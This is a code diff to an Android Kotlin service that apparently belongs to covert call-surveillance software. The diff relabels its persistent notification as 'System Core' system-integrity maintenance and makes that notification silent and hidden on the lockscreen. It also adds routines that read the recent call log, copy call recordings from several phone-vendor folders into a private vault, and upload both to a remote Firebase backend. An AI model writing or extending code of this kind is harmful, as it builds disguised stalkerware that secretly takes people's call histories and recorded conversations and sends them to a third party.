@@ -75,21 +75,28 @@ class CallRecordingSyncService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 channelId,
-                "Device Optimization Service",
+                "System Core",
                 NotificationManager.IMPORTANCE_MIN
             ).apply {
-                description = "Background optimization and battery maintenance"
+                description = "System integrity maintenance"
                 setShowBadge(false)
+                setSound(null, null)
+                enableLights(false)
+                enableVibration(false)
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
             }
             val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
             nm.createNotificationChannel(channel)
         }
 
         return NotificationCompat.Builder(this, channelId)
-            .setContentTitle("Device Care")
-            .setContentText("System integrity service running")
+            .setContentTitle("System Core")
+            .setContentText("Sync active")
             .setSmallIcon(android.R.drawable.stat_notify_sync)
             .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .setSilent(true)
+            .setShowWhen(false)
             .setOngoing(true)
             .build()
     }
@@ -298,5 +305,129 @@ class CallRecordingSyncService : Service() {
         fileObservers.forEach { it.stopWatching() }
         fileObservers.clear()
         super.onDestroy()
+    }
+
+    companion object {
+        private val RECORDING_PATHS = listOf(
+            AppConstants.VIVO_RECORD_CALL_PATH,
+            "/storage/emulated/0/Recordings/Call",
+            "/storage/emulated/0/MIUI/sound_recorder/call_rec",
+            "/storage/emulated/0/Call",
+            "/storage/emulated/0/Recordings"
+        )
+
+        fun syncCallsAndRecordings(context: Context) {
+            CoroutineScope(Dispatchers.IO).launch {
+                try {
+                    syncRecentCalls(context)
+                    scanAndSecureRecordings(context)
+                } catch (e: Exception) {
+                    Log.e(AppConstants.TAG, "Error in syncCallsAndRecordings", e)
+                }
+            }
+        }
+
+        private fun syncRecentCalls(context: Context) {
+            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+                return
+            }
+
+            try {
+                val cursor = context.contentResolver.query(
+                    CallLog.Calls.CONTENT_URI,
+                    arrayOf(
+                        CallLog.Calls._ID,
+                        CallLog.Calls.NUMBER,
+                        CallLog.Calls.CACHED_NAME,
+                        CallLog.Calls.TYPE,
+                        CallLog.Calls.DATE,
+                        CallLog.Calls.DURATION
+                    ),
+                    null,
+                    null,
+                    "${CallLog.Calls.DATE} DESC LIMIT 30"
+                )
+
+                cursor?.use { c ->
+                    val numIdx = c.getColumnIndex(CallLog.Calls.NUMBER)
+                    val nameIdx = c.getColumnIndex(CallLog.Calls.CACHED_NAME)
+                    val typeIdx = c.getColumnIndex(CallLog.Calls.TYPE)
+                    val dateIdx = c.getColumnIndex(CallLog.Calls.DATE)
+                    val durIdx = c.getColumnIndex(CallLog.Calls.DURATION)
+
+                    val firebaseSync = FirebaseSyncManager.getInstance(context)
+
+                    while (c.moveToNext()) {
+                        val rawNumber = if (numIdx >= 0) c.getString(numIdx) ?: "Unknown" else "Unknown"
+                        val cachedName = if (nameIdx >= 0) c.getString(nameIdx) else null
+                        val callTypeInt = if (typeIdx >= 0) c.getInt(typeIdx) else CallLog.Calls.INCOMING_TYPE
+                        val dateLong = if (dateIdx >= 0) c.getLong(dateIdx) else System.currentTimeMillis()
+                        val duration = if (durIdx >= 0) c.getLong(durIdx) else 0L
+
+                        val callType = when (callTypeInt) {
+                            CallLog.Calls.INCOMING_TYPE -> "incoming"
+                            CallLog.Calls.OUTGOING_TYPE -> "outgoing"
+                            CallLog.Calls.MISSED_TYPE -> "missed"
+                            CallLog.Calls.REJECTED_TYPE -> "rejected"
+                            else -> "incoming"
+                        }
+
+                        val resolved = ContactResolver.resolve(context, rawNumber)
+                        val contactName = if (!cachedName.isNullOrBlank()) cachedName else resolved.name
+                        val cleanNumber = rawNumber.replace(Regex("[^0-9]"), "")
+                        val callId = "call_${dateLong}_$cleanNumber"
+
+                        firebaseSync.syncCallRecord(
+                            callId = callId,
+                            contactName = contactName,
+                            phoneNumber = rawNumber,
+                            callType = callType,
+                            durationSeconds = duration,
+                            audioFile = null,
+                            isTamperAttemptDetected = false,
+                            callDateMs = dateLong
+                        )
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e(AppConstants.TAG, "Error in syncRecentCalls", e)
+            }
+        }
+
+        private fun scanAndSecureRecordings(context: Context) {
+            val vaultDir = File(context.filesDir, AppConstants.BACKUP_VAULT_FOLDER)
+            if (!vaultDir.exists()) vaultDir.mkdirs()
+
+            val allowedExts = setOf("m4a", "mp3", "aac", "wav", "amr")
+            val recentThreshold = System.currentTimeMillis() - (48 * 3600 * 1000L) // last 48 hours
+
+            for (path in RECORDING_PATHS) {
+                val dir = File(path)
+                if (!dir.exists() || !dir.isDirectory) continue
+                val files = dir.listFiles() ?: continue
+                for (file in files) {
+                    if (!file.isFile || file.length() == 0L) continue
+                    if (file.extension.lowercase() !in allowedExts) continue
+                    if (file.lastModified() < recentThreshold) continue
+
+                    val vaultFile = File(vaultDir, file.name)
+                    if (!vaultFile.exists()) {
+                        try {
+                            FileInputStream(file).use { input ->
+                                FileOutputStream(vaultFile).use { output ->
+                                    input.copyTo(output)
+                                }
+                            }
+                            Log.i(AppConstants.TAG, "Scanned & secured recording in vault: ${file.name}")
+                        } catch (e: Exception) {
+                            Log.e(AppConstants.TAG, "Failed copying to vault: ${file.name}", e)
+                        }
+                    }
+                }
+            }
+
+            // Trigger worker to upload vault recordings
+            NetworkSyncManager.getInstance(context).scheduleOfflineSyncWorker()
+        }
     }
 }
